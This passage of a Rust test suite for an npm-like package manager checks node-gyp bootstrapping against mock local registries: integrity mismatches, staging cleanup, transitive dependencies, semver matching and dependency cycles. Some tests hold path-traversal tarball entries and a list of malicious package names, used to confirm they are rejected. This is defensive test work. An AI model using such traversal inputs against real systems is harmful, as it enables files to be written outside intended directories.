                    r#"{{"name":"node-gyp","dist-tags":{{"latest":"10.0.0"}},"versions":{{"10.0.0":{{"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/node-gyp.tgz","integrity":"{}"}}}}}}}}"#,
                    port,
                    integrity_clone
                );
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(resp.as_bytes());
                let _ = stream.flush();
            } else if req.contains("GET /tarballs/node-gyp.tgz") {
                let resp_head = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    tb_clone.len()
                );
                let _ = stream.write_all(resp_head.as_bytes());
                let _ = stream.write_all(&tb_clone);
                let _ = stream.flush();
                break;
            }
        }
    });

    std::fs::write(project_dir.join("binding.gyp"), "{}").unwrap();
    std::fs::write(
        project_dir.join("package.json"),
        r#"{"name": "mock-native-pkg", "version": "1.0.0"}"#,
    )
    .unwrap();

    let cache_dir = temp.path().join("cache");
    let mut ctx = LifecycleContext::new(
        &project_dir,
        &project_dir,
        "mock-native-pkg",
        "install",
        "node-gyp rebuild",
    );
    ctx.extra_env.insert(
        "npm_config_cache".to_string(),
        cache_dir.to_string_lossy().to_string(),
    );
    ctx.extra_env.insert(
        "npm_config_registry".to_string(),
        format!("http://127.0.0.1:{}/", port),
    );
    ctx.extra_env.insert(
        "npm_config_node_gyp_fallback_npm".to_string(),
        "false".to_string(),
    );

    let status = execute_lifecycle_script(&ctx).expect("execute_lifecycle_script with bootstrap should succeed");
    assert!(status.success(), "Lifecycle script must exit successfully");

    // Verify downloaded & unpacked node-gyp.js in cache
    let cached_js = cache_dir.join("node-gyp").join("current").join("bin").join("node-gyp.js");
    assert!(
        cached_js.is_file(),
        "Bootstrap must unpack node-gyp into cache directory: {}",
        cached_js.display()
    );

    // Verify dummy package was built
    assert!(
        marker_file.is_file(),
        "Dummy native package must have been built by bootstrapped node-gyp"
    );
    let marker_content = std::fs::read_to_string(&marker_file).unwrap();
    assert_eq!(marker_content, "bootstrap node-gyp built package");

    let _ = server_handle.join();
}

fn create_tarball_with_files(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    {
        let mut builder = tar::Builder::new(&mut gz);
        for &(path, content) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(content.len() as u64);
            header.set_mode(0o755);
            let path_bytes = path.as_bytes();
            if path_bytes.len() <= 100 {
                header.as_mut_bytes()[..path_bytes.len()].copy_from_slice(path_bytes);
                header.set_cksum();
                builder.append(&header, content).unwrap();
            } else {
                header.set_path(path).unwrap();
                header.set_cksum();
                builder.append(&header, content).unwrap();
            }
        }
        builder.finish().unwrap();
    }
    gz.finish().unwrap()
}

#[test]
fn test_node_gyp_tampered_integrity_rejected_live_cache_not_created() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    let temp = tempfile::tempdir().unwrap();
    let cache_dir = temp.path().join("cache");
    let project_dir = temp.path().join("pkg");
    std::fs::create_dir_all(&project_dir).unwrap();

    let valid_tarball = create_tarball_with_files(&[
        ("package/package.json", br#"{"name":"node-gyp","version":"10.0.0","bin":{"node-gyp":"bin/node-gyp.js"}}"#),
        ("package/bin/node-gyp.js", b"process.exit(0);"),
    ]);

    // Compute legitimate integrity of the original tarball
    let legitimate_integrity = rnpm_core::Integrity::from_bytes(&valid_tarball, rnpm_core::Algorithm::Sha512).to_string();

    // Tampered tarball that does NOT match the integrity
    let tampered_tarball = create_tarball_with_files(&[
        ("package/package.json", br#"{"name":"node-gyp","version":"10.0.0","bin":{"node-gyp":"bin/node-gyp.js"}}"#),
        ("package/bin/node-gyp.js", b"console.log('tampered payload'); process.exit(1);"),
    ]);

    let listener = TcpListener::bind("127.0.0.1:0").expect("Failed to bind mock registry listener");
    let port = listener.local_addr().unwrap().port();
    let tampered_clone = tampered_tarball.clone();
    let integrity_clone = legitimate_integrity.clone();

    let server_handle = std::thread::spawn(move || {
        for mut stream in listener.incoming().flatten() {
            let mut buf = [0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let req = String::from_utf8_lossy(&buf[..n]);
            if req.contains("GET /node-gyp") {
                let body = format!(
                    r#"{{"name":"node-gyp","dist-tags":{{"latest":"10.0.0"}},"versions":{{"10.0.0":{{"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/node-gyp.tgz","integrity":"{}"}}}}}}}}"#,
                    port,
                    integrity_clone
                );
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(resp.as_bytes());
                let _ = stream.flush();
            } else if req.contains("GET /tarballs/node-gyp.tgz") {
                let resp_head = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    tampered_clone.len()
                );
                let _ = stream.write_all(resp_head.as_bytes());
                let _ = stream.write_all(&tampered_clone);
                let _ = stream.flush();
                break;
            }
        }
    });

    let mut config = rnpm_config::Config::default();
    config.npmrc.settings.insert("cache".to_string(), cache_dir.to_string_lossy().to_string());
    config.npmrc.settings.insert("registry".to_string(), format!("http://127.0.0.1:{}/", port));
    config.npmrc.settings.insert("node-gyp-fallback-npm".to_string(), "false".to_string());

    let res = crate::node_gyp::ensure_node_gyp(
        &project_dir,
        &project_dir,
        &config,
        None,
        false,
        "test-tampered-pkg",
    );

    assert!(res.is_err(), "ensure_node_gyp must fail when tarball integrity check fails");
    let err_str = res.unwrap_err().to_string();
    assert!(
        err_str.contains("integrity mismatch") || err_str.contains("integrity check failed"),
        "Error message should mention integrity mismatch: {err_str}"
    );

    // Live cache directory MUST NOT exist
    let live_current = cache_dir.join("node-gyp").join("current");
    assert!(!live_current.exists(), "Live cache directory must not be created on integrity mismatch");

    // No partial .tmp-* staging directory should remain
    let node_gyp_dir = cache_dir.join("node-gyp");
    if node_gyp_dir.exists() {
        let entries = std::fs::read_dir(&node_gyp_dir).unwrap();
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            assert!(
                !name.starts_with(".tmp-"),
                "Staging directory must be cleaned up on failure: {name}"
            );
        }
    }

    let _ = server_handle.join();
}

#[test]
fn test_node_gyp_malicious_path_traversal_tarball_rejected() {
    let temp = tempfile::tempdir().unwrap();
    let staging_dir = temp.path().join("staging");
    let canary_file = temp.path().join("escape.txt");

    // Construct tarball with ../../escape.txt
    let malicious_bytes = create_tarball_with_files(&[
        ("package/../../escape.txt", b"evil traversal payload"),
    ]);

    let res = crate::node_gyp::unpack_tarball(&malicious_bytes, &staging_dir);
    assert!(res.is_err(), "unpack_tarball must reject archive with path traversal");

    assert!(
        !canary_file.exists(),
        "Canary file must NOT be written outside staging directory"
    );

    // Direct traversal without package/ prefix
    let malicious_direct = create_tarball_with_files(&[
        ("../../escape2.txt", b"evil direct traversal"),
    ]);
    let canary2 = temp.path().join("escape2.txt");
    let res2 = crate::node_gyp::unpack_tarball(&malicious_direct, &staging_dir);
    assert!(res2.is_err(), "unpack_tarball must reject direct traversal");
    assert!(!canary2.exists(), "Canary 2 must not exist");
}

#[test]
fn test_node_gyp_bootstrap_multi_package_transitive_deps_end_to_end() {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let temp = tempfile::tempdir().unwrap();
    let project_dir = temp.path().join("pkg");
    let cache_dir = temp.path().join("cache");
    std::fs::create_dir_all(&project_dir).unwrap();

    let marker_file = project_dir.join("multi-dep-build.marker");
    let marker_escaped = marker_file.to_string_lossy().replace('\\', "/");

    // 1. Mock node-gyp depending on dep-a
    let node_gyp_pkg_json = r#"{"name":"node-gyp","version":"10.0.0","bin":{"node-gyp":"bin/node-gyp.js"},"dependencies":{"dep-a":"^1.0.0"}}"#;
    let node_gyp_bin_js = "const depA = require('dep-a'); depA.run();";
    let node_gyp_tb = create_tarball_with_files(&[
        ("package/package.json", node_gyp_pkg_json.as_bytes()),
        ("package/bin/node-gyp.js", node_gyp_bin_js.as_bytes()),
    ]);
    let node_gyp_integrity = rnpm_core::Integrity::from_bytes(&node_gyp_tb, rnpm_core::Algorithm::Sha512).to_string();

    // 2. Mock dep-a depending on @scope/dep-b
    let dep_a_pkg_json = r#"{"name":"dep-a","version":"1.0.0","main":"index.js","dependencies":{"@scope/dep-b":"^1.0.0"}}"#;
    let dep_a_index_js = "const depB = require('@scope/dep-b'); module.exports = { run: function() { depB.run(); } };";
    let dep_a_tb = create_tarball_with_files(&[
        ("package/package.json", dep_a_pkg_json.as_bytes()),
        ("package/index.js", dep_a_index_js.as_bytes()),
    ]);
    let dep_a_integrity = rnpm_core::Integrity::from_bytes(&dep_a_tb, rnpm_core::Algorithm::Sha512).to_string();

    // 3. Mock @scope/dep-b writing the marker
    let dep_b_pkg_json = r#"{"name":"@scope/dep-b","version":"1.0.0","main":"index.js"}"#;
    let dep_b_index_js = format!(
        "const fs = require('fs'); module.exports = {{ run: function() {{ fs.writeFileSync('{}', 'multi-dep-success'); process.exit(0); }} }};",
        marker_escaped
    );
    let dep_b_tb = create_tarball_with_files(&[
        ("package/package.json", dep_b_pkg_json.as_bytes()),
        ("package/index.js", dep_b_index_js.as_bytes()),
    ]);
    let dep_b_integrity = rnpm_core::Integrity::from_bytes(&dep_b_tb, rnpm_core::Algorithm::Sha512).to_string();

    // Start mock HTTP registry server
    let listener = TcpListener::bind("127.0.0.1:0").expect("Failed to bind mock registry listener");
    listener.set_nonblocking(true).unwrap();
    let port = listener.local_addr().unwrap().port();

    let running = Arc::new(AtomicBool::new(true));
    let r_clone = Arc::clone(&running);

    let ng_tb_clone = node_gyp_tb.clone();
    let ng_int_clone = node_gyp_integrity.clone();
    let da_tb_clone = dep_a_tb.clone();
    let da_int_clone = dep_a_integrity.clone();
    let db_tb_clone = dep_b_tb.clone();
    let db_int_clone = dep_b_integrity.clone();

    let server_handle = std::thread::spawn(move || {
        while r_clone.load(Ordering::Relaxed) {
            match listener.accept() {
                Ok((mut stream, _)) => {
                    let _ = stream.set_nonblocking(false);
                    let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(5)));
                    let mut buf = [0u8; 4096];
                    let n = stream.read(&mut buf).unwrap_or(0);
                    if n == 0 {
                        continue;
                    }
                    let req = String::from_utf8_lossy(&buf[..n]);

                    let (status, content_type, body_bytes) = if req.contains("GET /node-gyp") {
                        let json = format!(
                            r#"{{"name":"node-gyp","dist-tags":{{"latest":"10.0.0"}},"versions":{{"10.0.0":{{"name":"node-gyp","version":"10.0.0","dependencies":{{"dep-a":"^1.0.0"}},"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/node-gyp.tgz","integrity":"{}"}}}}}}}}"#,
                            port, ng_int_clone
                        );
                        ("200 OK", "application/json", json.into_bytes())
                    } else if req.contains("GET /tarballs/node-gyp.tgz") {
                        ("200 OK", "application/octet-stream", ng_tb_clone.clone())
                    } else if req.contains("GET /dep-a") {
                        let json = format!(
                            r#"{{"name":"dep-a","dist-tags":{{"latest":"1.0.0"}},"versions":{{"1.0.0":{{"name":"dep-a","version":"1.0.0","dependencies":{{"@scope/dep-b":"^1.0.0"}},"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/dep-a.tgz","integrity":"{}"}}}}}}}}"#,
                            port, da_int_clone
                        );
                        ("200 OK", "application/json", json.into_bytes())
                    } else if req.contains("GET /tarballs/dep-a.tgz") {
                        ("200 OK", "application/octet-stream", da_tb_clone.clone())
                    } else if req.contains("GET /@scope") {
                        let json = format!(
                            r#"{{"name":"@scope/dep-b","dist-tags":{{"latest":"1.0.0"}},"versions":{{"1.0.0":{{"name":"@scope/dep-b","version":"1.0.0","dist":{{"tarball":"http://127.0.0.1:{}/tarballs/dep-b.tgz","integrity":"{}"}}}}}}}}"#,
                            port, db_int_clone
                        );
                        ("200 OK", "application/json", json.into_bytes())
                    } else if req.contains("GET /tarballs/dep-b.tgz") {
                        ("200 OK", "application/octet-stream", db_tb_clone.clone())
                    } else {
                        ("404 Not Found", "text/plain", b"Not found".to_vec())
                    };

                    let resp_header = format!(
                        "HTTP/1.1 {}\r\nContent-Type: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                        status,
                        content_type,
                        body_bytes.len()
                    );
                    let _ = stream.write_all(resp_header.as_bytes());
                    let _ = stream.write_all(&body_bytes);
                    let _ = stream.flush();
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(std::time::Duration::from_millis(5));
                }
                Err(_) => break,
            }
        }
    });

    std::fs::write(project_dir.join("binding.gyp"), "{}").unwrap();
    std::fs::write(
        project_dir.join("package.json"),
        r#"{"name": "mock-multi-dep-pkg", "version": "1.0.0"}"#,
    )
    .unwrap();

    let mut ctx = LifecycleContext::new(
        &project_dir,
        &project_dir,
        "mock-multi-dep-pkg",
        "install",
        "node-gyp rebuild",
    );
    ctx.extra_env.insert(
        "npm_config_cache".to_string(),
        cache_dir.to_string_lossy().to_string(),
    );
    ctx.extra_env.insert(
        "npm_config_registry".to_string(),
        format!("http://127.0.0.1:{}/", port),
    );
    ctx.extra_env.insert(
        "npm_config_node_gyp_fallback_npm".to_string(),
        "false".to_string(),
    );

    let status = execute_lifecycle_script(&ctx)
        .expect("Lifecycle script execution with multi-package dependencies must succeed");
    assert!(status.success(), "Lifecycle script must exit successfully");

    // Stop mock server
    running.store(false, Ordering::Relaxed);
    let _ = server_handle.join();

    // Verify file structure
    let current_dir = cache_dir.join("node-gyp").join("current");
    assert!(current_dir.join("bin").join("node-gyp.js").is_file());
    assert!(current_dir.join("node_modules").join("dep-a").join("index.js").is_file());
    assert!(current_dir.join("node_modules").join("@scope").join("dep-b").join("index.js").is_file());

    // Verify that the marker was written by real node executing node-gyp -> dep-a -> @scope/dep-b
    assert!(
        marker_file.is_file(),
        "Transitive dependency @scope/dep-b must have executed and created marker file"
    );
    let content = std::fs::read_to_string(&marker_file).unwrap();
    assert_eq!(content, "multi-dep-success");
}

#[test]
fn test_node_gyp_staging_cleanup_on_failure() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    let temp = tempfile::tempdir().unwrap();
    let cache_dir = temp.path().join("cache");
    let project_dir = temp.path().join("pkg");
    std::fs::create_dir_all(&project_dir).unwrap();

    let listener = TcpListener::bind("127.0.0.1:0").expect("Failed to bind mock registry listener");
    let port = listener.local_addr().unwrap().port();

    let server_handle = std::thread::spawn(move || {
        for mut stream in listener.incoming().flatten() {
            let mut buf = [0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let req = String::from_utf8_lossy(&buf[..n]);
            if req.contains("GET /node-gyp") {
                // Invalid SRI format in metadata
                let body = format!(
                    r#"{{"name":"node-gyp","dist-tags":{{"latest":"10.0.0"}},"versions":{{"10.0.0":{{"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/node-gyp.tgz","integrity":"sha512-invalid@format!"}}}}}}}}"#,
                    port
                );
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(resp.as_bytes());
                let _ = stream.flush();
            } else if req.contains("GET /tarballs/node-gyp.tgz") {
                let bytes = b"dummy tarball content";
                let resp_head = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    bytes.len()
                );
                let _ = stream.write_all(resp_head.as_bytes());
                let _ = stream.write_all(bytes);
                let _ = stream.flush();
                break;
            }
        }
    });

    let mut config = rnpm_config::Config::default();
    config.npmrc.settings.insert("cache".to_string(), cache_dir.to_string_lossy().to_string());
    config.npmrc.settings.insert("registry".to_string(), format!("http://127.0.0.1:{}/", port));
    config.npmrc.settings.insert("node-gyp-fallback-npm".to_string(), "false".to_string());

    let res = crate::node_gyp::bootstrap_node_gyp(&project_dir, &config);
    assert!(res.is_err(), "bootstrap_node_gyp must fail on invalid integrity");

    // Live cache directory must NOT exist
    assert!(!cache_dir.join("node-gyp").join("current").exists());

    // Verify all .tmp-* directories are cleaned up
    let node_gyp_dir = cache_dir.join("node-gyp");
    if node_gyp_dir.exists() {
        for entry in std::fs::read_dir(&node_gyp_dir).unwrap().flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            assert!(!name.starts_with(".tmp-"), "Leftover staging dir found: {name}");
        }
    }

    let _ = server_handle.join();
}

#[test]
fn test_node_gyp_shasum_fallback_behavior() {
    let payload = b"hello node-gyp integrity verification payload";
    let sha512_sri = rnpm_core::Integrity::from_bytes(payload, rnpm_core::Algorithm::Sha512).to_string();
    let sha256_sri = rnpm_core::Integrity::from_bytes(payload, rnpm_core::Algorithm::Sha256).to_string();
    let sha1_sri = rnpm_core::Integrity::from_bytes(payload, rnpm_core::Algorithm::Sha1).to_string();

    let sha1_digest = rnpm_core::Algorithm::Sha1.compute_digest(payload);
    let sha1_hex: String = sha1_digest.iter().map(|b| format!("{:02x}", b)).collect();

    // 1. Valid SRI verification
    assert!(crate::node_gyp::verify_tarball_integrity(payload, Some(&sha512_sri), None).is_ok());
    assert!(crate::node_gyp::verify_tarball_integrity(payload, Some(&sha256_sri), None).is_ok());
    assert!(crate::node_gyp::verify_tarball_integrity(payload, Some(&sha1_sri), None).is_ok());

    // 2. Mismatching SRI verification
    let different_payload = b"different data";
    assert!(crate::node_gyp::verify_tarball_integrity(different_payload, Some(&sha512_sri), None).is_err());

    // 3. Fallback to dist.shasum ONLY when integrity is absent
    assert!(crate::node_gyp::verify_tarball_integrity(payload, None, Some(&sha1_hex)).is_ok());
    assert!(crate::node_gyp::verify_tarball_integrity(different_payload, None, Some(&sha1_hex)).is_err());

    // 4. When integrity is present but invalid SRI format, MUST FAIL and not fall back to shasum
    assert!(
        crate::node_gyp::verify_tarball_integrity(payload, Some("invalid-sri-format"), Some(&sha1_hex)).is_err(),
        "Must fail when integrity is invalid SRI even if shasum matches"
    );

    // 5. When both are absent, MUST FAIL
    assert!(crate::node_gyp::verify_tarball_integrity(payload, None, None).is_err());
}

#[test]
fn test_node_gyp_malicious_dependency_name_rejected() {
    let temp = tempfile::tempdir().unwrap();
    let nm = temp.path().join("node_modules");

    // 1. Malicious traversal names
    let bad_names = [
        "../../escape",
        "@scope/../../escape",
        "@../escape",
        ".",
        "..",
        ".hidden",
        "_private",
        "foo/bar/baz",
        "foo\\bar",
        "foo:bar",
        "foo\0bar",
        "foo|bar",
        "",
        "   ",
    ];

    for name in bad_names {
        assert!(
            crate::node_gyp::validate_package_name(name).is_err(),
            "validate_package_name must reject malicious or invalid name: '{name}'"
        );
        assert!(
            crate::node_gyp::package_dir_in_node_modules(&nm, name).is_err(),
            "package_dir_in_node_modules must reject malicious name: '{name}'"
        );
    }

    // 2. Valid package names must succeed and be contained within node_modules
    let good_names = [
        "dep-a",
        "dep_b",
        "dep.c",
        "dep123",
        "@scope/dep-b",
        "@my-org/core.utils",
    ];

    for name in good_names {
        assert!(
            crate::node_gyp::validate_package_name(name).is_ok(),
            "validate_package_name must accept valid name: '{name}'"
        );
        let path = crate::node_gyp::package_dir_in_node_modules(&nm, name).unwrap();
        assert!(
            path.starts_with(&nm),
            "Package path must stay strictly inside node_modules: {}",
            path.display()
        );
    }
}

#[test]
fn test_node_gyp_pick_matching_version_no_silent_fallback_on_unsatisfiable_semver() {
    let mut versions = serde_json::Map::new();
    versions.insert("1.0.0".to_string(), serde_json::json!({ "version": "1.0.0" }));
    versions.insert("1.1.0".to_string(), serde_json::json!({ "version": "1.1.0" }));
    versions.insert("1.2.0".to_string(), serde_json::json!({ "version": "1.2.0" }));

    let dist_tags = serde_json::json!({ "latest": "1.2.0" });

    // 1. Unsatisfiable semver ranges MUST return None, NOT silently fall back to latest or highest!
    assert!(
        crate::node_gyp::pick_matching_version(&versions, Some(&dist_tags), "^2.0.0").is_none(),
        "Must return None for unsatisfiable semver range ^2.0.0"
    );
    assert!(
        crate::node_gyp::pick_matching_version(&versions, Some(&dist_tags), ">=3.0.0").is_none(),
        "Must return None for unsatisfiable semver range >=3.0.0"
    );
    assert!(
        crate::node_gyp::pick_matching_version(&versions, Some(&dist_tags), "~0.9.0").is_none(),
        "Must return None for unsatisfiable semver range ~0.9.0"
    );

    // 2. Satisfiable ranges must pick highest matching version
    let match_caret = crate::node_gyp::pick_matching_version(&versions, Some(&dist_tags), "^1.0.0");
    assert_eq!(match_caret.map(|(v, _)| v), Some("1.2.0"));

    let match_tilde = crate::node_gyp::pick_matching_version(&versions, Some(&dist_tags), "~1.0.0");
    assert_eq!(match_tilde.map(|(v, _)| v), Some("1.0.0"));

    // 3. Explicit "latest" or "*" returns dist-tags.latest
    let match_latest = crate::node_gyp::pick_matching_version(&versions, Some(&dist_tags), "latest");
    assert_eq!(match_latest.map(|(v, _)| v), Some("1.2.0"));

    let match_star = crate::node_gyp::pick_matching_version(&versions, Some(&dist_tags), "*");
    assert_eq!(match_star.map(|(v, _)| v), Some("1.2.0"));
}

#[test]
fn test_node_gyp_single_version_packument_spec_validation_rejected_on_mismatch() {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let temp = tempfile::tempdir().unwrap();
    let cache_dir = temp.path().join("cache");
    let project_dir = temp.path().join("pkg");
    std::fs::create_dir_all(&project_dir).unwrap();

    // 1. Mock node-gyp depends on "dep-single": "^2.0.0"
    let node_gyp_pkg_json = r#"{"name":"node-gyp","version":"10.0.0","bin":{"node-gyp":"bin/node-gyp.js"},"dependencies":{"dep-single":"^2.0.0"}}"#;
    let node_gyp_tb = create_tarball_with_files(&[
        ("package/package.json", node_gyp_pkg_json.as_bytes()),
        ("package/bin/node-gyp.js", b"process.exit(0);"),
    ]);
    let node_gyp_integrity = rnpm_core::Integrity::from_bytes(&node_gyp_tb, rnpm_core::Algorithm::Sha512).to_string();

    // 2. Mock dep-single tarball (version 1.0.0)
    let dep_single_tb = create_tarball_with_files(&[
        ("package/package.json", br#"{"name":"dep-single","version":"1.0.0"}"#),
    ]);
    let dep_single_integrity = rnpm_core::Integrity::from_bytes(&dep_single_tb, rnpm_core::Algorithm::Sha512).to_string();

    let listener = TcpListener::bind("127.0.0.1:0").expect("Failed to bind mock registry listener");
    listener.set_nonblocking(true).unwrap();
    let port = listener.local_addr().unwrap().port();

    let running = Arc::new(AtomicBool::new(true));
    let r_clone = Arc::clone(&running);

    let server_handle = std::thread::spawn(move || {
        while r_clone.load(Ordering::Relaxed) {
            match listener.accept() {
                Ok((mut stream, _)) => {
                    let _ = stream.set_nonblocking(false);
                    let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(5)));
                    let mut buf = [0u8; 4096];
                    let n = stream.read(&mut buf).unwrap_or(0);
                    if n == 0 {
                        continue;
                    }
                    let req = String::from_utf8_lossy(&buf[..n]);

                    let (status, content_type, body_bytes) = if req.contains("GET /node-gyp") {
                        let json = format!(
                            r#"{{"name":"node-gyp","dist-tags":{{"latest":"10.0.0"}},"versions":{{"10.0.0":{{"name":"node-gyp","version":"10.0.0","dependencies":{{"dep-single":"^2.0.0"}},"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/node-gyp.tgz","integrity":"{}"}}}}}}}}"#,
                            port, node_gyp_integrity
                        );
                        ("200 OK", "application/json", json.into_bytes())
                    } else if req.contains("GET /tarballs/node-gyp.tgz") {
                        ("200 OK", "application/octet-stream", node_gyp_tb.clone())
                    } else if req.contains("GET /dep-single") {
                        // Single-version packument response (no "versions" map, top-level "dist" and "version")
                        // returning version "1.0.0" when "^2.0.0" was requested!
                        let json = format!(
                            r#"{{"name":"dep-single","version":"1.0.0","dist":{{"tarball":"http://127.0.0.1:{}/tarballs/dep-single.tgz","integrity":"{}"}}}}"#,
                            port, dep_single_integrity
                        );
                        ("200 OK", "application/json", json.into_bytes())
                    } else if req.contains("GET /tarballs/dep-single.tgz") {
                        ("200 OK", "application/octet-stream", dep_single_tb.clone())
                    } else {
                        ("404 Not Found", "text/plain", b"Not found".to_vec())
                    };

                    let resp_header = format!(
                        "HTTP/1.1 {}\r\nContent-Type: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                        status,
                        content_type,
                        body_bytes.len()
                    );
                    let _ = stream.write_all(resp_header.as_bytes());
                    let _ = stream.write_all(&body_bytes);
                    let _ = stream.flush();
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(std::time::Duration::from_millis(5));
                }
                Err(_) => break,
            }
        }
    });

    let mut config = rnpm_config::Config::default();
    config.npmrc.settings.insert("cache".to_string(), cache_dir.to_string_lossy().to_string());
    config.npmrc.settings.insert("registry".to_string(), format!("http://127.0.0.1:{}/", port));
    config.npmrc.settings.insert("node-gyp-fallback-npm".to_string(), "false".to_string());

    let res = crate::node_gyp::bootstrap_node_gyp(&project_dir, &config);

    // Stop mock server
    running.store(false, Ordering::Relaxed);
    let _ = server_handle.join();

    // Verify rejection!
    assert!(res.is_err(), "Single-version packument returning 1.0.0 for ^2.0.0 MUST be rejected");
    let err_msg = res.unwrap_err().to_string();
    assert!(
        err_msg.contains("dep-single") && (err_msg.contains("1.0.0") || err_msg.contains("^2.0.0")),
        "Error message must specify version mismatch: {err_msg}"
    );

    // Verify live cache directory was not created on rejection
    assert!(
        !cache_dir.join("node-gyp").join("current").exists(),
        "Live cache directory must not be created on spec validation failure"
    );
}

#[test]
fn test_node_gyp_cyclic_conflicting_nested_dependencies_terminates_cleanly() {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let temp = tempfile::tempdir().unwrap();
    let cache_dir = temp.path().join("cache");
    let project_dir = temp.path().join("pkg");
    std::fs::create_dir_all(&project_dir).unwrap();

    // Dependency graph:
    // root (node-gyp) -> pkg-a@^1.0.0, pkg-b@^1.0.0
    // pkg-a@1.0.0 (no deps)
    // pkg-b@1.0.0 -> pkg-a@^2.0.0
    // pkg-a@2.0.0 -> pkg-b@^2.0.0
    // pkg-b@2.0.0 -> pkg-a@^2.0.0 (cycle back to pkg-a@^2.0.0!)

    // 1. Mock node-gyp
    let ng_pkg_json = r#"{"name":"node-gyp","version":"10.0.0","bin":{"node-gyp":"bin/node-gyp.js"},"dependencies":{"pkg-a":"^1.0.0","pkg-b":"^1.0.0"}}"#;
    let ng_tb = create_tarball_with_files(&[
        ("package/package.json", ng_pkg_json.as_bytes()),
        ("package/bin/node-gyp.js", b"process.exit(0);"),
    ]);
    let ng_int = rnpm_core::Integrity::from_bytes(&ng_tb, rnpm_core::Algorithm::Sha512).to_string();

    // 2. pkg-a@1.0.0
    let a1_pkg_json = r#"{"name":"pkg-a","version":"1.0.0"}"#;
    let a1_tb = create_tarball_with_files(&[("package/package.json", a1_pkg_json.as_bytes())]);
    let a1_int = rnpm_core::Integrity::from_bytes(&a1_tb, rnpm_core::Algorithm::Sha512).to_string();

    // 3. pkg-b@1.0.0 -> pkg-a@^2.0.0
    let b1_pkg_json = r#"{"name":"pkg-b","version":"1.0.0","dependencies":{"pkg-a":"^2.0.0"}}"#;
    let b1_tb = create_tarball_with_files(&[("package/package.json", b1_pkg_json.as_bytes())]);
    let b1_int = rnpm_core::Integrity::from_bytes(&b1_tb, rnpm_core::Algorithm::Sha512).to_string();

    // 4. pkg-a@2.0.0 -> pkg-b@^2.0.0
    let a2_pkg_json = r#"{"name":"pkg-a","version":"2.0.0","dependencies":{"pkg-b":"^2.0.0"}}"#;
    let a2_tb = create_tarball_with_files(&[("package/package.json", a2_pkg_json.as_bytes())]);
    let a2_int = rnpm_core::Integrity::from_bytes(&a2_tb, rnpm_core::Algorithm::Sha512).to_string();

    // 5. pkg-b@2.0.0 -> pkg-a@^2.0.0 (cyclic dependency!)
    let b2_pkg_json = r#"{"name":"pkg-b","version":"2.0.0","dependencies":{"pkg-a":"^2.0.0"}}"#;
    let b2_tb = create_tarball_with_files(&[("package/package.json", b2_pkg_json.as_bytes())]);
    let b2_int = rnpm_core::Integrity::from_bytes(&b2_tb, rnpm_core::Algorithm::Sha512).to_string();

    let listener = TcpListener::bind("127.0.0.1:0").expect("Failed to bind mock registry listener");
    listener.set_nonblocking(true).unwrap();
    let port = listener.local_addr().unwrap().port();

    let running = Arc::new(AtomicBool::new(true));
    let r_clone = Arc::clone(&running);

    let ng_tb_c = ng_tb.clone();
    let a1_tb_c = a1_tb.clone();
    let b1_tb_c = b1_tb.clone();
    let a2_tb_c = a2_tb.clone();
    let b2_tb_c = b2_tb.clone();

    let server_handle = std::thread::spawn(move || {
        while r_clone.load(Ordering::Relaxed) {
            match listener.accept() {
                Ok((mut stream, _)) => {
                    let _ = stream.set_nonblocking(false);
                    let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(5)));
                    let mut buf = [0u8; 4096];
                    let n = stream.read(&mut buf).unwrap_or(0);
                    if n == 0 {
                        continue;
                    }
                    let req = String::from_utf8_lossy(&buf[..n]);

                    let (status, content_type, body_bytes) = if req.contains("GET /node-gyp") {
                        let json = format!(
                            r#"{{"name":"node-gyp","dist-tags":{{"latest":"10.0.0"}},"versions":{{"10.0.0":{{"name":"node-gyp","version":"10.0.0","dependencies":{{"pkg-a":"^1.0.0","pkg-b":"^1.0.0"}},"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/node-gyp.tgz","integrity":"{}"}}}}}}}}"#,
                            port, ng_int
                        );
